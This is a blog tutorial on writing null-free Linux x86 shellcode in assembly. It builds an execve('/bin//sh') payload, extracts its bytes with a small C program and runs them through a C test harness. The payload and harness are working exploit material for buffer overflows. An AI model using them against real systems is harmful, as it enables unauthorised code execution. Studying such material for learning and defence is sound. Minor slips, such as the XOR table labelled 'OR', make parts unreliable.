---
layout: post
title: "Shellcode Linux x86 (Part 1.0)"
date: 2016-04-24 23:58:00 +0100
categories: exploit
tags:
  - shellcode
  - shellcoding
  - assembly
  - ASM
author: unh0lys0da
---
Welcome back fellow 0x00'ers, we are back and rolling.
I hope you like our new site, if you have any questions, find us on #nullbyte at irc.freenode.net.

<!--more-->

## Requirements
Alright so this isn't going to be msfvenom tutorial. (shellcodes are payloads). 
This tutorial will focus on writing shellcodes using Assembly.

Knowledge of C and Assembly is highly recommend. Also knowing how the stack works is a big plus.

## Memory Segments
When a program is run it is loaded in the RAM. Normally 5 segments are used in programs:

    The stack segment (For function calls (dynamic)).
    The heap segment (For dynamicly allocating memory).
    The data segment (Variables).
    The bss segment (Variables).
    The text segment (Set of instructions (The actual code)).

With assembly you have total control over these segments.
In shellcoding however we will only be using the text and the stack segment.

## Assembly primer
So first we need to know some assembly.

**The registers**
We will be focusing on a couple of registers:

    The EAX register
    The EBX register
    The ECX register
    The EDX register
    The ESP register

These registers are like little pieces of memory that are in the CPU. 
They have nothing to do with RAM though as they are part of the CPU. 
The CPU uses these registers to do calculations and perform simple algorithms.

In assembly we adress these registers, they can be thought of as variables.

**Assembly instructions**
There are some instructions that are important in assembly programming:

    MOV (assign, for example MOV EAX, 32 (EAX = 32)).
    XOR (Exclusive OR, for example XOR EAX, EAX)
    PUSH (Push something on the stack, example: PUSH EAX).
    POP (Load what was on the stack in a register/variable, example: POP EBX).
    CALL (Call a function, for example: CALL FuncPrint).
    INT (Interrupt, kernel command, for example INT 0x80 which is used in calling syscalls).

Be sure that you understand these concepts. 
You can ofcourse try to learn what they mean from this tutorial, 
but it's better to take your time to learn about these from a more in depth source.

## Syscalls
What is important in shellcoding, is making use of syscalls. 
Syscalls are functions that the kernel recognizes, this means that if your shellcode calls a syscall, 
you don't have to include headers or declare them.

[http://syscalls.kernelgrok.com/](Here) you can find an overview of all linux x86 syscalls, look up syscall 11 (0xB).

A syscall takes arguments like normal functions, however syscalls are different in that they don't use the stack. 
You can think of syscall parameters like argv[] in C:

argv[0] the 'first' argument (your program in C), would be the EAX register. 
This is also where you load the syscall number, for execve this is 11, or 0xB in hexa.

argv[1] is like the second argument and would be the EBX register. For example the string "/bin/bash",

note that a string in C is called as a pointer, for example char *s = "Hello World". 
The variable 's' is a pointer and NOT the actual string, it's a memory adress where the string is stored. 
s could be something like 0x4000b401. On 0x4000b401 you'd then find the value '/' or 0x2f in hexa. 
This get's read until the nullbyte 0x00. The actual string would never fit in the 32 bit registry.

The third argument is ECX, for execve this would be the arguments for the program that gets called (also a string).

## A too simple shellcode
A shellcode is in many ways similar to a normal program, except for the fact that it uses the RAM used by the program you are exploitating (so not his own).

The name shellcode is kind of misleading, it implies shellcodes are used to spawn shells, however nowadays there are many other uses for shellcodes, 
like `chmod 777` a certain program, or `download` and `execute` a file, nevertheless 'shellcode' was the name that stick.

Today we will be writing a simple shellcode that spawns a shell.

First though, we will write a normal assembly program. You will need nasm installed on your machine to compile it. 
`sudo apt-get install nasm`.

So here is the assembly program:
{% highlight nasm lineos %}
section .data
  msg db '/bin/sh' ; db stands for define byte, msg will now be a string pointer.
 
section .text
  global _start   ; Needed for compiler, comparable to int main()
 
_start:
  mov eax, 11     ; eax = 11, think of it like this mov [destination], [source], 11 is execve
  mov ebx, msg    ; Load the string pointer into ebx
  mov ecx, 0      ; no arguments in exc
  int 0x80        ; syscall
 
  mov eax, 1      ; exit syscall
  mov ebx, 0      ; no errors
  int 0x80        ; syscall
{% endhighlight %}

Copy and paste it in an editor and save as shell.asm
To compile it use the following commands:
`nasm -f elf -o shell.o shell.asm`
`ld -o shell shell.o`
Now run it with:
`./shell`

Awesome, a shell. This is what we wanted!, easy right?
Now lets try to extract the shellcode.
To do so use the command:
`objdump -M intel -d shell`
This will result in:
![http://imgur.com/UYj7wms]()
Lets look at the 2nd line in _start, instead of msg, it says 0x80490a0. This the memory adress of the string msg.

This is a problem though. Remember that I said a shellcode doesnt use it's own RAM, but that of the program? 
This means, that the adress 0x80490a0 probably contains either garbage or nothing. 
Since the .data segment of our assembly program isn't used in the shellcode.
The shellcode would be:
`"\xb8\x0b\x00\x00\x00\x00\xbb\xa0\x90\x04\x08\xb9\x00\x00\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80"`
Now we face another problem, nullbytes.

## Eliminating nullbytes
Before we continue, let's do an experiment with a C program.
Open up an editor and write the simple program:
{% highlight c lineos %}
#include <stdio.h>
int main()
{
    printf("Hello\x00 World!");

    return 0;
}
{% endhighlight %}
Compile and run.

Result:
`Hello`

So what happened here? If you've programmed with C you may know the problem here, strings use \x00 for terminating.
In a bufferoverflow, the shellcode (which is a string) gets loaded on the stack. 
Therefore a nullbyte will terminate the chain of instructions.

So now let's look at our program once again.

## XOR
Like I said earlier XOR is an assembly instruction.
XOR is like OR, however there is one major difference.
Let's look at two tables.
OR:
1 OR 1 = 1
1 OR 0 = 1
0 OR 1 = 1
0 OR 0 = 0

XOR:
1 OR 1 = 0
1 OR 0 = 1
0 OR 1 = 1
0 OR 0 = 0

So how is this relevant? Well remember that you can't use nullbytes. 
So if you want to put 0 in a register, doing MOV EAX, 0, would cause a nullbyte.

Lets say the EAX register looks like this:
<many zero's and one's>...0010001101
XOR'ing EAX with itself would cause each bit to XOR itself.
the bit is either 1 or 0.
1 XOR 1 = 0.
0 XOR 0 = 0.
Therefore every bit gets set to 0.
Doing so would be the same as mov eax, 0, but without the use of nullbytes.

Now let's look at the code objdump once again.

Notice that the operation MOV EAX, 0xb, still gives nullbytes as a result. 
The reason for this is the fact that EAX is a 32 bit register.

You can read the line b8 0b 00 00 00 as:
b8 (EAX) 0b (11) 00 00 00 which translates to: EAX = 00 00 00 0b, which translates to EAX = 11, or MOV EAX, 0xb.


## Adressing Lower Halves of Registries

If you're already familiar with assembly you might've read that EAX's lower half can also be used for instructions. 
This lower half is called AX and is 2 bytes (16 bits) in size.

AX can also be split. the higher half is called AH and the lower half is called AL.
Think of it like this:

`[---16bits---|--AH-8bits-|--AL-8bits-]`

`[---16bits---|----------16bits-AX-------]`

`[-----------------32bits---EAX-------------]`

So in order to assign 11 to EAX, we have to combine the things we discussed.
First we need to make sure EAX doesn't contain garbage values.
To do so we zero EAX out with the XOR operator.
XOR EAX, EAX
Now we can assign 11 to the lower half of EAX.
MOV AL, 0xb (11)


## Using the Stack to Store Variables

So we already have the first argument for our syscall ready.

Now we need to assign a string pointer to EBX, but before we do that, we need something to point to, that is, the actual character array:

`|'/'|'b'|'i'|'n'|'/'|'s'|'h'|\x00|`

The only dynamic memory we can use for this is the stack.
Note that each ascii character has a corresponding hex value, a table can be found [http://www.asciitable.com/](here).
from left to right the hexcodes are:
0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68 0x00.
What we can do is push these on the stack. Then we can use the stack pointer ESP as a string pointer.
Because the stack is FILO and grows downwards, we have to assign the values in reverse order.
To push values on the stack you can use the command PUSH:
PUSH <value>, be aware that you can only push 4 bytes, each time.
Now a problem arises. You cant push "/sh\x00" on the stack. as it will terminate the shellcode.
To do so, we have to go back a few steps and look at our first two lines:
XOR EAX, EAX
MOV AL, 0xb

Notice that after XOR EAX, EAX, EAX will have the value 0.

In shellcoding it is sometimes wiser to use this to our advantage as long as possible, because we now have a 0 we can assign, with this in mind we will postpone the COMMAND MOV AL, 0xb.

So instead of pushing 0x0068732f ("\x00hs/") on the stack. we split it in two parts: 0x00 and 0x68732f.
Now instead of doing PUSH 0x00, we do PUSH EAX.
It has the same result, but we avoided a nullbyte.
Next we can do:
PUSH 0x68732f2f (Added a / here to avoid a nullbyte).
PUSH 0x6e69622f

Now the the stack pointer will point to the string "/bin//sh".
So this will be our 2nd argument (EBX).
MOV EBX, ESP

The third argument (ECX) for our syscall execve is a string with arguments for /bin/sh. Ofcourse we don't want this to contain garbage, because that would result in sh not running and giving a warning about invalid arguments. Therefore we need ECX to be 0.

Once again we can use our EAX register.
MOV ECX, EAX

Finally we assign EAX:
MOV AL, 0xb

And do the syscall;
INT 0x80
This leaves us with the following code:

{% highlight nasm lineos %}
section .text
  global _start

_start:
  xor eax, eax
  push eax
  push 0x68732f2f
  push 0x6e69622f
  mov ebx, esp
  mov ecx, eax
  mov al, 0xb
  int 0x80
{% endhighlight %}

## Extracting the Shellcode
Now let's compile it
`nasm -f elf -o shell.o shell.asm`
`ld -o shell shell.o`

Now to get the shellcode I wrote this C program:
{% highlight c lineos %}
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

int main(int argc, char *argv[])
{
        char l = 1;
        unsigned char buf;
        int fd;
        fd = open(argv[1],0,S_IRUSR);
        while(read(fd,&buf,1)) {
                if(buf == 0 && l == 1) {
                        printf(" \n");
                        l = 0;
                }
                else if(buf) {
                        printf("\\x%02x",buf);
                        l = 1;
                }
        }

        close(fd);
}
{% endhighlight %}
It will ignore caves of nullbytes and only show continues hexdumps.
One of these lines is your shellcode.

To check if your shellcode works you can use this simple C program:
{% highlight c %}
int main()
{
  char *shellcode = "<the shellcode>";

  (*(void(*)()) shellcode)();
}
{% endhighlight %}

That was all for today, hope you enjoyed it!

unh0lys0da
